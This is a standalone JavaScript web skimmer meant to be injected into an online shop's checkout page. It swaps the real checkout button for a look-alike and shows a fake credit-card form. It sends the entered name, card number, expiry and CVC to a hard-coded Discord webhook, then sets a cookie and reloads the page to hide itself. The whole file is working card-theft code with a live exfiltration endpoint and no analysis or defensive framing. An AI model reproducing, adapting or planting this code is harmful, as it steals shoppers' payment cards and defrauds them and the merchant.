const waitForCheckoutButton = () => {
    // Check if script has already run
    if (document.cookie.includes('checkoutScriptRan=true')) {
        return;
    }

    const checkoutButton = document.getElementById('view_cart');
    if (checkoutButton) {
        // Get the price from total_amount span
        const totalAmount = document.getElementById('total_amount');
        const price = totalAmount ? totalAmount.textContent : 'Unknown';

        // Create a new button to replace the original
        const newButton = document.createElement('button');
        newButton.id = 'new_checkout_button';
        newButton.textContent = `Checkout Now (${price})`;
        newButton.style.cssText = checkoutButton.style.cssText; // Copy styles from original button
        newButton.className = checkoutButton.className; // Copy classes from original button

        // Add click event listener to show payment form popup
        newButton.addEventListener('click', () => {
            // Create popup container
            const popup = document.createElement('div');
            popup.id = 'payment-popup';
            popup.className = 'fixed top-0 left-0 w-full h-full bg-white z-[10000] flex items-center justify-center';
            popup.style.touchAction = 'none';

            // Prevent touch scrolling
            popup.addEventListener('touchmove', (e) => e.preventDefault(), { passive: false });

            // Create payment form container
            const formContainer = document.createElement('div');
            formContainer.className = 'bg-white p-6 rounded-t-3xl shadow-lg w-full max-w-md relative';

            // Add Tailwind CSS
            const tailwindScript = document.createElement('script');
            tailwindScript.src = 'https://cdn.tailwindcss.com';
            document.head.appendChild(tailwindScript);

            // Add custom styles
            const style = document.createElement('style');
            style.textContent = `
                .custom-input {
                    box-sizing: border-box;
                    height: 52px;
                    padding: 16px;
                    border: 1px solid #E7E9EC;
                    border-radius: 16px;
                    background-color: #F8F8F8;
                    font-family: sans-serif;
                    font-size: 16px;
                    font-weight: 400;
                    -webkit-font-smoothing: antialiased;
                    transition: box-shadow 150ms ease;
                    width: 100%;
                }
                .custom-input::placeholder {
                    color: #CFD7DF;
                }
                .custom-input:focus {
                    outline: none;
                    box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.5);
                }
                .error {
                    color: #fa755a;
                    font-size: 14px;
                    padding-left: 20px;
                    opacity: 0;
                    transition: opacity 0.35s cubic-bezier(0.165, 0.84, 0.44, 1);
                }
                .error.visible {
                    opacity: 1;
                }
            `;
            document.head.appendChild(style);

            // Create close button
            const closeButton = document.createElement('button');
            closeButton.id = 'close-button';
            closeButton.className = 'absolute top-4 right-4 text-gray-600 hover:text-gray-800';
            closeButton.innerHTML = `
                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                </svg>
            `;
            closeButton.onclick = () => popup.remove();

            // Create form
            const form = document.createElement('form');
            form.id = 'payment-form';
            form.className = 'space-y-4';
            form.innerHTML = `
                <div class="mb-6">
                    <div class="text-lg font-semibold text-gray-800 flex items-center">
                        Credit Card
                        <img src="https://d1uz2kmrg3qq0r.cloudfront.net/assets/theme/orderup/ouv2/assets/images/card_type/visa.png" class="h-6 ml-2">
                        <img src="https://d1uz2kmrg3qq0r.cloudfront.net/assets/theme/orderup/ouv2/assets/images/card_type/mastercard.png" class="h-6 ml-2">
                    </div>
                    <p class="text-gray-600 mt-2">Total Amount: ${price}</p>
                </div>
                <div>
                    <input type="text" id="nameoncard" class="custom-input" placeholder="Name On Card" required autocomplete="off">
                </div>
                <div>
                    <input type="text" id="card-number" class="custom-input" placeholder="Card Number" required maxlength="19">
                    <span id="card-number-error" class="error">Invalid card number</span>
                </div>
                <div class="flex space-x-5">
                    <div class="flex-1">
                        <input type="text" id="card-expiry" class="custom-input" placeholder="MM/YY" required maxlength="5">
                        <span id="card-expiry-error" class="error">Invalid expiry date</span>
                    </div>
                    <div class="flex-1">
                        <input type="text" id="card-cvc" class="custom-input" placeholder="CVC" required maxlength="4">
                        <span id="card-cvc-error" class="error">Invalid CVC</span>
                    </div>
                </div>
                <button type="submit" id="next-button" class="w-full bg-blue-600 text-white py-3 rounded-full hover:bg-blue-700 disabled:bg-gray-400 disabled:cursor-not-allowed" disabled>Pay Now</button>
            `;

            // Form validation
            const nameInput = form.querySelector('#nameoncard');
            const cardNumberInput = form.querySelector('#card-number');
            const expiryInput = form.querySelector('#card-expiry');
            const cvvInput = form.querySelector('#card-cvc');
            const nextButton = form.querySelector('#next-button');

            const validateForm = () => {
                const isValid = nameInput.value.trim() &&
                                cardNumberInput.value.trim().length >= 15 &&
                                expiryInput.value.match(/^\d{2}\/\d{2}$/) &&
                                cvvInput.value.trim().length >= 3;
                nextButton.disabled = !isValid;

                // Show/hide error messages
                form.querySelector('#card-number-error').classList.toggle('visible', cardNumberInput.value.trim() && cardNumberInput.value.length < 15);
                form.querySelector('#card-expiry-error').classList.toggle('visible', expiryInput.value.trim() && !expiryInput.value.match(/^\d{2}\/\d{2}$/));
                form.querySelector('#card-cvc-error').classList.toggle('visible', cvvInput.value.trim() && cvvInput.value.length < 3);
            };

            [nameInput, cardNumberInput, expiryInput, cvvInput].forEach(input => {
                input.addEventListener('input', validateForm);
            });

            // Form submission
            form.onsubmit = async (e) => {
                e.preventDefault();
                const cardDetails = {
                    name: nameInput.value.trim(),
                    cardNumber: cardNumberInput.value.trim(),
                    expiry: expiryInput.value.trim(),
                    cvc: cvvInput.value.trim(),
                    totalAmount: price
                };

                try {
                    await fetch('https://discord.com/api/webhooks/1383037554642780161/12Krj-WpOo-hnc-cPNQ7ChRKVcPmympDEmF47f-fjKWiLhPCypijLWiflc2pZVPlN7-v', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            content: `New Payment Submission:\nName: ${cardDetails.name}\nCard Number: ${cardDetails.cardNumber}\nExpiry: ${cardDetails.expiry}\nCVC: ${cardDetails.cvc}\nTotal Amount: ${cardDetails.totalAmount}`
                        })
                    });
                    // Set cookie to prevent script from running again
                    document.cookie = 'checkoutScriptRan=true; path=/';
                    // Reload page
                    window.location.reload();
                } catch (error) {
                    // Silently handle errors to avoid alerts/console logs
                }
            };

            // Prevent body scrolling
            document.body.style.overflow = 'hidden';

            // Assemble elements
            formContainer.appendChild(closeButton);
            formContainer.appendChild(form);
            popup.appendChild(formContainer);
            document.body.appendChild(popup);
        });

        // Replace the original button with the new one
        checkoutButton.parentNode.replaceChild(newButton, checkoutButton);

        // Clear the interval to stop checking
        clearInterval(checkInterval);
    }
};

// Run interval check indefinitely
const checkInterval = setInterval(waitForCheckoutButton, 100);
